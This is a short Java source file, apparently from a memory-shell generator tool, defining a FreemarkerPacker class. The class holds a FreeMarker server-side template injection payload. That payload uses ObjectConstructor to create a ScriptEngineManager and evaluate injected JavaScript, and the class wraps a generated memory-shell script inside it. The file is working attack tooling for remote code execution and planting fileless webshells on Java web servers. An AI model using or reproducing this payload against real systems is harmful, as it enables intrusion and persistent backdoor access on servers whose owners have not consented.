package com.reajason.javaweb.memshell.packer.freemarker;

import com.reajason.javaweb.memshell.Packers;
import com.reajason.javaweb.memshell.config.GenerateResult;
import com.reajason.javaweb.memshell.packer.Packer;

/**
 * @author ReaJason
 * @since 2024/12/13
 */
public class FreemarkerPacker implements Packer {
    String template = "${'freemarker.template.utility.ObjectConstructor'?new()('javax.script.ScriptEngineManager').getEngineByName('js').eval('{{script}}')}";

    @Override
    public String pack(GenerateResult generateResult) {
        String script = Packers.ScriptEngine.getInstance().pack(generateResult);
        return template.replace("{{script}}", script);
    }
}
